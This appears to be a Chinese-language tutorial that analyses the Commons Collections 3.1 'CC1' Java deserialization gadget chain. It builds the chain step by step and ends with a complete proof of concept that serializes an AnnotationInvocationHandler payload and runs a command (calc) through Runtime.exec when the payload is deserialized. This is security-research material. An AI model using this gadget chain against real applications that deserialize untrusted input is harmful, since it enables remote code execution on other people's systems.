# 分析版本

Commons Collections 3.1

JDK 8u65

环境配置参考

[配置]: https://xz.aliyun.com/t/12669?time__1311=mqmhDvqIxfgD8DlxGo4%2BxCw67o7KKG%3Dz4D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F

# 分析过程

首先看下CC1利用链的RCE利用点，在接口Transformer

![image-20240624170550724](https://s2.loli.net/2024/06/24/9Hcdyio18EzYDaw.png)

接下来查看此接口的实现类，右键Go To Implementation

![image-20240624170711205](https://s2.loli.net/2024/06/24/iDdezLKBk9CjJs2.png)

去看这些实现类的源码，最后在InvokerTransformer类中找到了利用点，反射。

![image-20240624170846045](https://s2.loli.net/2024/06/24/7XGNqZmsoxfDCjc.png)

根据RCE利用点的代码，可以先把POC写一部分，之后慢慢改。(注释是一行实现)

```java
        Runtime runtime = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        invokerTransformer.transform(runtime);
//new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(runtime);
```

我们现在有了利用点，就要向上找使用，最后找到序列化的方法利用链才完成。

**在这里先插入一个Runtime类的序列化问题**，Runtime类是不能反序列化的。看下Runtime类源码

```java
    private static Runtime currentRuntime = new Runtime();
    public static Runtime getRuntime() {
        return currentRuntime;
    }
```

getRuntime方法返回了一个实例化的Runtime。

考虑利用反射获取Runtime原型类，调用getRuntime方法去实例化Runtime。

```java
        Class runtime = Class.forName("java.lang.Runtime");
        Method getRuntime = runtime.getDeclaredMethod("getRuntime");
        Runtime r = (Runtime) getRuntime.invoke(null, null);   //获取runtime实例化对象

        Method exec = runtime.getDeclaredMethod("exec", String.class);
        exec.invoke(r,"calc");
```

之后再想如何和我们找到的RCE利用点结合。InvokerTransformer，可以命令执行。通过反射调用InvokerTransformer去执行上面实例化Runtime类的命令。

```java
        // 使用 InvokerTransformer 获取 getRuntime 方法
        Method getRuntime = (Method) new InvokerTransformer("getDeclaredMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class); //方法 方法参数类型 参数 类

        // 使用 InvokerTransformer 调用invoke 方法
        Runtime r = (Runtime) new  InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntime);

        // 使用 InvokerTransformer 获取 exec 方法
        Method execMethod = (Method) new InvokerTransformer(
                "getDeclaredMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"exec", new Class[]{String.class}}
        ).transform(Runtime.class);

        // 使用 InvokerTransformer 调用 exec 方法
        new InvokerTransformer(
                "invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{r, new Object[]{"calc"}}
        ).transform(execMethod);




        //new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(r);
        //这句可以代替上面的两句，因为已经获取到了runtime的实例，直接调用runtime的exec方法就行
```

观察代码发现，我们对InvokerTransformer的调用是一条链，一句的输入是上一句的输出。这里就会用到CC库的ChainedTransformer类（可以熟悉下CC库一些类的功能）

ChainedTransformer的构造方法是public，参数是Transfromer[]（Transfrome数组），所以我们先初始化一个Transfromer数组，再把这个数组放入ChainedTransformer的构造方法参数处。

更新Poc

```java
        Transformer[] transformers = new Transformer[] {
            new InvokerTransformer("getDeclaredMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(Runtime.class);
```

之后，开始搜索transform的方法调用，在TransformedMap类中的三个方法都调用了transform方法。

```java
    protected Object transformKey(Object object) {
        if (keyTransformer == null) {
            return object;
        }
        return keyTransformer.transform(object);
    }

    protected Object transformValue(Object object) {
        if (valueTransformer == null) {
            return object;
        }
        return valueTransformer.transform(object);
    }

    protected Object checkSetValue(Object value) {
        return valueTransformer.transform(value);
    }
```

（只有checkSetValue方法最后才能到readObject()）

接下来利用链就变成了，调用TransformedMap类的checkSetValue方法(当然我们要控制传值)。

TransformedMap的构造方法是protected类型，所以考虑decorate方法给TransformedMap赋值。

```java
    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer);
    }
```

到这里利用链变为

```java
        Runtime runtime = Runtime.getRuntime();

        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        HashMap hashMap = new HashMap();
        TransformedMap transformedMap = (TransformedMap) TransformedMap.decorate(hashMap, null, invokerTransformer);
        //之后调用checkSetValue
```

但是，checkSetValue方法是protected类型，无法直接调用.

我们看这个方法的调用。TransformedMap继承的AbstractInputCheckedMapDecorator抽象类中setValue方法调用了checkValue方法。

setValue方法又是在MapEntry（AbstractInputCheckedMapDecorator的内部类）中，这个内部类是继承了AbstractMapEntryDecorator类，重写了AbstractMapEntryDecorator类的setValue方法。

AbstractMapEntryDecorator类又引入了了Map.Entry（Map的键值对）接口。在Map.Entry中setValue方法是给键值对的value赋值的。

![image-20240625153801181](https://s2.loli.net/2024/06/25/Lk2NKtaBo7FRySi.png)

到这最终我们是找到了Map.Entry的setValue方法，我们用Map进行键值对的遍历就能调用到setValue方法。

更新下Poc

```java
        Transformer[] transformers = new Transformer[] {
            new InvokerTransformer("getDeclaredMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(1,1); //不复制的话Map为空，不能遍历Map
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer); //super传的是hashMap.put(1,1)
        for(Map.Entry entry:transformedMap.entrySet()) {
            entry.setValue(Runtime.class);
        }
```

**（其实不止上面的调用，写完这个Poc可以自己debug一下看下调用过程）**

接下来去找setValue的调用，最后在AnnotationInvocationHandler中找到了在readObject方法中的调用。到此利用链完成。

![image-20240625154223501](https://s2.loli.net/2024/06/25/UEmgxTwnRY6LXVb.png)

```java
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {  //遍历Map<String, object> memberValues是Map类 memberValue是键值对
            String name = memberValue.getKey();                     //取键值对的key, memberValue
            Class<?> memberType = memberTypes.get(name);            //返回key对应的映射(Value), Class<? extends Annotation> type
            if (memberType != null) {  // i.e. member still exists  //type中需要有memberValues的key
                Object value = memberValue.getValue();              //取键值对的value, memberValue
                if (!(memberType.isInstance(value) ||               //判断两个对象类型，value是否可以强制转化为memberType
                      value instanceof ExceptionProxy)) {           //value是否是ExceptionProxy的实例化对象
                    memberValue.setValue(                           //memberValue需要设置为AbstractInputCheckedMapDecorator
                        new AnnotationTypeMismatchExceptionProxy(   //runtime
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
```

观察readObject逻辑，大体结构和我们刚刚写的Poc是相同的，是一个Map的遍历，并且Map.Entry调用setValue方法。

这里面要注意判断条件，控制程序运行到setValue的位置。

1. 

```java
if (memberType != null) {  // i.e. member still exists  //type中需要有memberValues的key
```

过这个判断，需要注释type类中需要有与我们传入的memberValues中键值对的key相等一次（Class<?> memberType = memberTypes.get(name);）这个才不返回null。

这里我们用Target类，里面有个value数组。我们要把遍历的hashMap键值对的key改为value。

```java
public @interface Target {
    /**
     * Returns an array of the kinds of elements an annotation type
     * can be applied to.
     * @return an array of the kinds of elements an annotation type
     * can be applied to
     */
    ElementType[] value();
}
```

2. ```java
                               if (!(memberType.isInstance(value) ||               //判断两个对象类型，value是否可以强制转化为memberType
                                     value instanceof ExceptionProxy)) {           //value是否是ExceptionProxy的实例化对象
   ```

过这个判断，Target的value和hashMap键值对的value是不同类型。并且hashMap键值对的value不是ExceptionProxy类的实例化对象

3. setValue中传入的并不是runtime

```java
                    memberValue.setValue(                           
                        new AnnotationTypeMismatchExceptionProxy(   
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
```

![image-20240629171001578](https://s2.loli.net/2024/06/29/zJcruRAOvkh3SPM.png)

但是我们没法控制这里的memberValue.setValue()的传值，

回想一下利用思路，我们利用ChainedTransformer

`chainedTransformer.transform(Runtime.class);` 是为了执行

`invokerTransformer.transform(Runtime.class);`

所以我们保证ChainedTransformer初始化的Transfrom数组的第一行`new InvokerTransformer("getDeclaredMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}).tranform(XXX)`

的XXX为Runtim.class就好。

解决这个问题，用到了ConstantTransformer类，构造的时候输入什么，在调用方法的就返回什么

```java
public ConstantTransformer(Object constantToReturn) {
    super();
    iConstant = constantToReturn;
}
public Object transform(Object input) {
    return iConstant;
}
```

我们构造时输入Runtime.class，在调用tranform时返回Runtime.class。

正好第一行`new InvokerTransformer("getDeclaredMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}).tranform(XXX)`中输入XXX的值就变为Runtime.class.

最终的Poc

```java
public class cc1_poc {
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("s.ser"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception {
//7
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod",new Class[]{String.class, Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("value",1); //不复制的话Map为空，不能遍历Map
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer); //super传的是hashMap.put(1,1)

        Class annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object object = constructor.newInstance(Target.class, transformedMap);

        serialize(object);
        unserialize("s.ser");
    }
}
```



